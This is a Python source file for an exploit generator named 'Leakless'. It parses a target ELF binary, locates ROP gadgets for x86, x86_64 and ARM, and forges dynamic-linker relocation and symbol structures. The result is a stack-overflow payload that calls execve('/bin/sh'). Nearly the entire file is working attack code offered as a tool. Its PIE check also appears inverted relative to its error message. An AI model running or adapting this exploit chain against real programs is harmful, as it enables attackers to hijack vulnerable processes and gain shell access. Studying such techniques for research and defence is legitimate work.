import os
import sys
import json
import argparse

import elftools.elf.structs
from elftools.elf.elffile import ELFFile
from elftools.elf.constants import P_FLAGS, SH_FLAGS
from elftools.elf.enums import ENUM_E_TYPE

from utils import *
from memory import *

ElfN_Versym_size = 2

relocation_types = {
    "EM_386": 7,
    "EM_X86_64": 7,
    "EM_ARM": 22
}

class Exploit:
    __slots__ = "arch", "little", "pointer_size", "bss", "dynstr", "dynsym", \
                "relplt", "plt", "filler", "relocation_type", \
                "gnuversion", "dynamic", "versym", "gadgets", "fini"

    def __init__(self):
        self.gadgets = {}
        self.empty_exploit = lambda: ""

    def allocate_helpers(self, buffer):
        pass

    def add_gadget(self, architecture, name, info, gadget):
        """Adds a gadget to the collection of gadgets for the specified architecture."""
        if architecture not in self.gadgets:
            self.gadgets[architecture] = {}
        self.gadgets[architecture][name] = (info, gadget)

    def get_gadget(self, name):
        """Returns the gadget with the specified name for the current architecture"""
        return self.gadgets[self.arch][name]

    def config_from_elf(self, path):
        """Load all the necessary information about the program parsing the ELF
        headers. Furthermore, check some pre-requisites for the exploit to be
        successful."""
        with open(path, "r") as executable_file:
            elf = ELFFile(executable_file)
            get_section = lambda name: first_or_none(filter(lambda section: section.name == name, elf.iter_sections()))

            # Checks
            if elf.header.e_type == ENUM_E_TYPE["ET_EXEC"]:
                raise Exception("Only non-PIE executables are supported")

            # Binary type
            self.arch = elf.header.e_machine
            self.little = elf.little_endian
            self.pointer_size = elf.elfclass / 8
            self.pointer_format = ("0x%." + str(self.pointer_size * 2) + "x")
            self.structs = elftools.elf.structs.ELFStructs(self.little, self.pointer_size * 8)

            # Useful sections
            self.sections = {section.name: section for section in elf.iter_sections()}
            self.dynstr = get_section(".dynstr").header.sh_addr
            self.dynsym = get_section(".dynsym").header.sh_addr

            relplt_section = get_section(".rel.plt")
            self.addend = relplt_section is None
            if self.addend:
                relplt_section = get_section(".rela.plt")
            self.relplt = relplt_section.header.sh_addr

            self.plt = get_section(".plt").header.sh_addr
            self.gnuversion = get_section(".gnu.version").header.sh_addr

            # Dynamic section
            dynamic_section = get_section(".dynamic")
            self.writable_dynamic = dynamic_section.header.sh_flags & SH_FLAGS.SHF_WRITE
            self.dynamic = dynamic_section.header.sh_addr
            dynamic_entries = [self.structs.Elf_Dyn.parse(dynamic_entry)
                               for dynamic_entry in
                               chunks(dynamic_section.data(), self.structs.Elf_Dyn.sizeof())]
            fini = filter(lambda (i, entry): entry.d_tag == "DT_FINI", enumerate(dynamic_entries))
            if len(fini) > 0:
                self.fini = self.dynamic + self.structs.Elf_Dyn.sizeof() * fini[0][0]
            versyms = filter(lambda (i, entry): entry.d_tag == "DT_VERSYM", enumerate(dynamic_entries))
            if len(versyms) > 0:
                self.versym = self.dynamic + self.structs.Elf_Dyn.sizeof() * versyms[0][0]

            # Gadgets
            if self.gadgets.has_key(self.arch):
                executable_sections = filter(lambda segment: segment.header.p_flags  & P_FLAGS.PF_X, elf.iter_segments())

                for name, (info, gadget) in self.gadgets[self.arch].iteritems():
                    location = find_string(executable_sections, hex_bytes(gadget))
                    if location is None:
                        raise Exception("Can't find gadget " + name)
                    self.gadgets[self.arch][name] = (info, gadget, location)

            # Find all '\x00\x00' in non-writeable sections
            non_writeable_sections = filter(lambda segment: not (segment.header.p_flags & P_FLAGS.PF_W), elf.iter_segments())
            self.zero_zero_addresses = find_all_strings(non_writeable_sections, "\x00\x00")

            self.filler = self.ptr2str(reduce(lambda x,y: (x << 32) | 0xdeadb00b, xrange(1 + (self.pointer_size % 4)), 0))
            self.relocation_type = relocation_types[self.arch]

        log(self.dump())

    def dump(self):
        """Dump all the information held by this Exploit instance for debugging
        purposes."""
        return "\n".join([slot + ": " + str(getattr(self, slot)) for slot in self.__slots__])

    # Utility functions
    # =================

    def ptr2str(self, integer):
        """Convert a pointer (in the form of an integer) to a byte string of its memory
        representation according the current architecture endianness."""
        string = integer_to_bigendian(integer)
        if self.little:
            return string.rjust(self.pointer_size, "\x00")[::-1]
        else:
            return string.ljust(self.pointer_size, "\x00")

    def str2ptr(self, string):
        """Convert a byte string representing a pointer to an integer."""
        ptr = bigendian_to_integer(string)
        if self.little:
            return int("".join(reversed(list(chunks(ptr, 2)))), 16)
        else:
            return int(ptr, 16)

    # Abstractions to write memory
    # ============================

    def write_string(self, memory_area, string):
        """Write an input string in the specified memory area invoking an appropriate
        number of times the do_writemem function."""
        string_len = len(string)
        if string_len > memory_area.size:
            raise Exception("You're trying to write {} bytes in a MemoryArea {} bytes wide".format(string_len, memory_area.size))

        result = self.empty_exploit()
        remaining = string
        while len(remaining) > 0:
            remaining, writer = self.do_writemem(self.ptr2str(memory_area.start + len(string) - len(remaining)), remaining)
            result += writer

        memory_area.content += string

        return result

    def write_pointer(self, memory_area, pointer):
        """Write a pointer (an integer) to a memory area."""
        return self.write_string(memory_area, self.ptr2str(pointer))

    # Craft data structures for _dl_fixup
    # ===================================

    def jump_to(self, buffer, function_name):
        """Craft the necessary data structures (Elf_Rela?, Elf_Sym, version index) and
        strings to pass to the dynamic linker."""

        # Ensure the function name ends with a '\0'
        if not function_name.endswith("\0"):
            function_name += "\0"

        # Choose between Elf_Rel and Elf_Rela depending on the architecture
        rel_struct = self.structs.Elf_Rela if self.addend else self.structs.Elf_Rel

        # Allocate the buffers necessary for the data structure we're going to
        # create
        relocation_target = buffer.allocate(self.pointer_size, name="relocation_target")
        function_name_str = buffer.allocate(len(function_name), self.dynstr, 1, name="function_name_str")

        # TODO: move symbol as first thing in the buffer
        symbol_constraint = lambda address, index: (self.gnuversion + ElfN_Versym_size * index) in self.zero_zero_addresses if self.versym else lambda x,y: True
        symbol = buffer.allocate(self.structs.Elf_Sym.sizeof(), self.dynsym, name="symbol", constraint=symbol_constraint)

        # Looks like 64-bit and 32-bit have different alignment for the call to _dl_fixup
        reloc_alignment = 1 if self.pointer_size * 8 == 32 else rel_struct.sizeof()
        reloc = buffer.allocate(rel_struct.sizeof(), self.relplt, reloc_alignment, name="reloc")

        # OK, let's start setting up the part of the ROP exploit to write the
        # data structures
        exploit = self.empty_exploit()

        # TODO: merge consecutive string writes for possible optimizations
        # Append the creation of the function name string to the exploit
        exploit += self.write_string(function_name_str, function_name)

        # Append the creation of the Elf_Sym structure to the exploit
        function_symbol = self.structs.Elf_Sym.parse("\0" * self.structs.Elf_Sym.sizeof())
        function_symbol.st_name = function_name_str.index
        function_symbol.st_info.bind = "STB_GLOBAL"
        function_symbol.st_info.type = "STT_FUNC"

        exploit += self.write_string(symbol, self.structs.Elf_Sym.build(function_symbol))

        # Append the creation of the Elf_Rela? structure to the exploit
        function_reloc = rel_struct.parse("\0" * rel_struct.sizeof())
        function_reloc.r_offset = relocation_target.start
        function_reloc.r_info_type = self.relocation_type
        function_reloc.r_info_sym = symbol.index

        if self.pointer_size * 8 == 32:
            function_reloc.r_info = function_reloc.r_info_type | (function_reloc.r_info_sym << 8)
        else:
            function_reloc.r_info = function_reloc.r_info_type | (function_reloc.r_info_sym << 32)

        exploit += self.write_string(reloc, rel_struct.build(function_reloc))

        # Return two things: the launch ROP invocation and the data structure
        # set-up ROP chain
        return exploit, reloc.index

class RawDumperExploit(Exploit):
    def __init__(self):
        Exploit.__init__(self)
        self.empty_exploit = lambda: []

    def do_writemem(self, address, value):
        """Write a pointer-sized buffer to the specfied location."""
        return "", [(address, value)]

class CommonGadgetsExploit(Exploit):
    """Mainly add a pool of gadgets common in the various architectures."""
    def __init__(self):
        Exploit.__init__(self)

        # Good for FreeBSD

        # self.add_gadget("EM_386", "writemem", 4,
        #                 " 8b 44 24 08" + # mov    eax,DWORD PTR [esp+0x8] \
        #                 " 8b 4c 24 04" + # mov    ecx,DWORD PTR [esp+0x4] \
        #                 " 89 01" +       # mov    DWORD PTR [ecx],eax \
        #                 " c3")           # ret

        # self.add_gadget("EM_386", "cleanup", 3,
        #                 " 83 c4 0c" + # add    esp,0xc \
        #                 " c3")        # ret

        # Good for Linux

        self.add_gadget("EM_386", "writemem", 4,
                        " 8b 54 24 08" + # mov edx,DWORD PTR [esp+0x8] \
                        " 8b 44 24 04" + # mov eax,DWORD PTR [esp+0x4] \
                        " 89 10"       + # mov DWORD PTR [eax],edx \
                        " c3")           # ret

        self.add_gadget("EM_386", "cleanup", 4,
                        " 5b" + # pop ebx \
                        " 5e" + # pop esi \
                        " 5f" + # pop edi \
                        " 5d" + # pop ebp \
                        " c3")  # ret

        # This gadget requires 6 useless parameters

        self.add_gadget("EM_X86_64", "writemem", 8,
                        " 48 8b 54 24 10" + # mov rdx,QWORD PTR [rsp+0x10] \
                        " 48 8b 44 24 08" + # mov rax,QWORD PTR [rsp+0x8] \
                        " 48 89 10"       + # mov QWORD PTR [rax],rdx \
                        " c3")              # ret

        self.add_gadget("EM_X86_64", "writemem", 8,
                        " 48 89 37"       + # mov    QWORD PTR [rdi],rsi \
                        " c3")              # ret

        self.add_gadget("EM_X86_64", "cleanup", 6,
                        " 5b"    + # pop    rbx \
                        " 5d"    + # pop    rbp \
                        " 41 5c" + # pop    r12 \
                        " 41 5d" + # pop    r13 \
                        " 41 5e" + # pop    r14 \
                        " 41 5f" + # pop    r15 \
                        " c3")     # ret

        self.add_gadget("EM_X86_64", "args", None,
                        " 4c 89 ea" +   # mov    rdx,r13 \
                        " 4c 89 f6" +   # mov    rsi,r14 \
                        " 44 89 ff" +   # mov    edi,r15d \
                        " 41 ff 14 dc") # call   QWORD PTR [r12+rbx*8]

        # Assume LE

        self.add_gadget("EM_ARM", "writemem", 4,
                        " 00 10 80 e5" + # str     r1, [r0] \
                        " 1e ff 2f e1")  # bx      lr

        # Better not use this due to a bug in QEMU

        #self.add_gadget("EM_ARM", "prepare_regs", None,
        #                " f8 85 bd e8")  # pop     {r3, r4, r5, r6, r7, r8, sl, pc}

        self.add_gadget("EM_ARM", "prepare_regs", None,
                        " f8 85 bd 08")  # popeq   {r3, r4, r5, r6, r7, r8, sl, pc}

        self.add_gadget("EM_ARM", "setup_args", None,
                        " 07 00 a0 e1" + # mov     r0, r7 \
                        " 08 10 a0 e1" + # mov     r1, r8 \
                        " 0a 20 a0 e1" + # mov     r2, sl \
                        " 01 40 84 e2" + # add     r4, r4, #1 \
                        " 33 ff 2f e1" + # blx     r3 \
                        " 06 00 54 e1" + # cmp     r4, r6 \
                        " f7 ff ff 1a" + # bne     8604 <__libc_csu_init+0x38> \
                        " f8 85 bd e8")  # pop     {r3, r4, r5, r6, r7, r8, sl, pc}

        self.add_gadget("EM_ARM", "just_ret", None,
                        " 1e ff 2f e1")  # bx      lr

    def allocate_helpers(self, buffer):
        """Allocate helper buffers needed by some specific platforms (e.g. for cleanup
        purposes)"""
        Exploit.allocate_helpers(self, buffer)
        if self.arch == "EM_X86_64":
            self.popret = buffer.allocate(self.pointer_size, name="popret")
            nope, nope, cleanup_location = self.get_gadget("cleanup")
            return self.write_pointer(self.popret, cleanup_location + 8)
        return ""

    def call(self, invocation, parameters):
        """ROP function invocation: return a ROP chain that sets up the arguments on the
        stack and/or on the registers, invoke the function and cleanup the
        arguments."""
        if self.arch == "EM_386":
            return self.call32(invocation, parameters)
        elif self.arch == "EM_X86_64":
            return self.call64(invocation, parameters)
        elif self.arch == "EM_ARM":
            return self.call_arm(invocation, parameters)
        else:
            raise Exception("Unsupported architecture")

    def call32(self, invocation, parameters):
        """Implements the i386 calling convention."""
        cleanup_size, nope, cleanup_location = self.get_gadget("cleanup")
        if len(parameters) > cleanup_size:
            raise Exception("Too many parameters, find a better gadget")

        return invocation + \
               self.ptr2str(cleanup_location) + \
               "".join(map(str, parameters)) + \
               self.filler * (cleanup_size - len(parameters))

    def call64(self, invocation, parameters):
        """Implements the x86_64 calling convention."""
        if len(parameters) > 3:
            raise Exception("Too many parameters")
        elif self.str2ptr(parameters[0]) & 0xffffffff00000000 != 0:
            raise Exception("First parameters high part has to be 0")
        elif len(parameters) == 0:
            return invocation
        elif len(parameters) < 3:
            parameters = parameters + [self.ptr2str(0)] * (3 - len(parameters))

        nope, nope, args_location = self.get_gadget("args")
        nope, nope, cleanup_location = self.get_gadget("cleanup")
        result = self.ptr2str(cleanup_location)
        result += self.ptr2str(0) # rbx
        result += self.ptr2str(1) # rbp == rbx + 1
        result += self.ptr2str(self.fini + 8) # r12, jump to pop;ret
        result += parameters[2] # r13 -> rdx
        result += parameters[1] # r14 -> rsi
        result += parameters[0] # r15 -> edi
        result += self.ptr2str(args_location) # move registers; call pop;ret
        result += self.filler * 7
        result += invocation

        return result

    def call_arm(self, invocation, parameters):
        """Implements the ARM calling convention."""
        if len(parameters) > 3:
            raise Exception("Too many parameters, find a better gadget")
        elif len(parameters) == 0:
            return invocation
        elif len(parameters) < 3:
            parameters = parameters + [self.ptr2str(0)] * (3 - len(parameters))

        nope, nope, prepare_regs_location = self.get_gadget("prepare_regs")
        nope, nope, just_ret_location = self.get_gadget("just_ret")
        nope, nope, setup_args_location = self.get_gadget("setup_args")
        result = self.ptr2str(prepare_regs_location)
        #result += self.ptr2str(just_ret_location) # r3, target of a blx
        result += invocation[0:4] # r3, target of a blx
        result += self.ptr2str(0) # r4
        result += self.filler # r5
        result += self.ptr2str(1) # r6 == r4 + 1
        result += parameters[0] # r7 -> r0
        result += parameters[1] # r8 -> r1
        result += parameters[2] # sl -> r2
        result += self.ptr2str(setup_args_location) # pc
        result += self.filler * 7 # pop again 7 regs + pc
        #result += invocation # pc
        result += invocation[4:] # pc

        return result

    def do_writemem(self, address, value):
        """Write a pointer-sized buffer to the specfied location. This function uses the
        writemem gadget."""
        write_size, nope, location = self.get_gadget("writemem")

        remaining = ""
        if len(value) > write_size:
            remaining = value[write_size:]
            value = value[0:write_size]
        elif len(value) < write_size:
            value = value.ljust(write_size, "\0")

        result = self.call(self.ptr2str(location), [address, value])
        return remaining, result

class ExecveExploit(CommonGadgetsExploit):
    def launch(self, program):
        """Launch an execve("/bin/sh/", &null, &null); exploit."""

        buffer = Buffer(self, self.sections[".bss"].header.sh_addr, size=self.sections[".bss"].header.sh_size)

        binsh_str = program + "\0"

        pointer_to_null = buffer.allocate(self.pointer_size, name="pointer_to_null")
        binsh = buffer.allocate(len(binsh_str), name="binsh")

        exploit = ""

        exploit += self.allocate_helpers(buffer)

        # Pointer to NULL
        exploit += self.write_pointer(pointer_to_null, 0)

        # /bin/sh
        exploit += self.write_string(binsh, binsh_str)

        prepare, reloc_index = self.jump_to(buffer, "execve")

        # Invocation of the dynamic linker resolver (plt[0]) with the
        # appropriate relocation index
        launch = self.ptr2str(self.plt) + self.ptr2str(reloc_index)

        exploit += prepare

        exploit += self.call(launch, [binsh.pointer, pointer_to_null.pointer, pointer_to_null.pointer]) + self.filler

        log(buffer.dump())

        return exploit

def main():
    parser = argparse.ArgumentParser(description='Leakless')
    parser.add_argument('executable', metavar='EXECUTABLE', help='Path to the executable to exploit.', nargs=1)
    parser.add_argument('--json', action='store_true', help="Don't build the ROP chain, just dump on standard output what's necessary for the exploit.")
    parser.add_argument('--debug', action='store_true', help="Print debug information.")
    parser.add_argument('--offset', metavar='OFFSET', type=int, help='Offset to overwrite the saved PC.')
    args = parser.parse_args()

    executable_path = args.executable[0]

    if not args.debug:
        sys.stderr = open(os.devnull, 'w')

    if args.json:
        exploit = RawDumperExploit()
        exploit.config_from_elf(executable_path)
        buffer = Buffer(exploit, exploit.sections[".bss"].header.sh_addr, size=exploit.sections[".bss"].header.sh_size)
        prepare, relocation_index = exploit.jump_to(buffer, "execve")

        what_to_write = []

        for address, value in prepare:
            what_to_write.append({"address": hex(exploit.str2ptr(address)), "value": value.encode("hex")})

            result = {"write": what_to_write, "dl_address": hex(exploit.plt), "index": relocation_index}

        sys.stdout.write(json.dumps(result, indent=4, sort_keys=True) + "\n")
        return

    if not args.offset:
        log("Please give me the offset to reach the saved PC.")
        sys.exit(-1)

    exploit = ExecveExploit()
    exploit.config_from_elf(executable_path)
    sys.stdout.write("A" * args.offset + exploit.launch("/bin/sh"))

if __name__ == "__main__":
    main()
